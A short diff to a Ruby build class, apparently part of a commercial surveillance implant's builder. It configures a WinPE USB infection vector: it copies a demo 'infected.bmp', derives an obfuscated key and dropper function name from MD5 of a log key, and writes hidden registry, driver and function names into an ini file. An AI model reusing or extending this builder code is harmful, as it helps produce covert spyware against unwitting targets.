@@ -41,10 +41,14 @@ class BuildUSB < Build
       @outputs << "winpe/RCSPE/files/#{platform.upcase}/" + v
     end
 
+    FileUtils.cp(File.join(build.tmpdir, 'demo_image'), path("winpe/RCSPE/files/#{platform.upcase}/infected.bmp")) if params['demo']
+
     build.clean
 
-    key = @factory.logkey.chr.ord
-    key = "%02X" % ((key > 127) ? (key - 256) : key)
+    key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
+
+    # calculate the function name for the dropper
+    funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
     # write the ini file
     File.open(path('winpe/RCSPE/RCS.ini'), 'w') do |f|
@@ -61,6 +65,7 @@ class BuildUSB < Build
       f.puts "HREG=#{names[:reg]}"
       f.puts "HSYS=ndisk.sys"
       f.puts "HKEY=#{key}"
+      f.puts "FUNC=" + funcname
     end
 
     @outputs << 'winpe/RCSPE/RCS.ini'
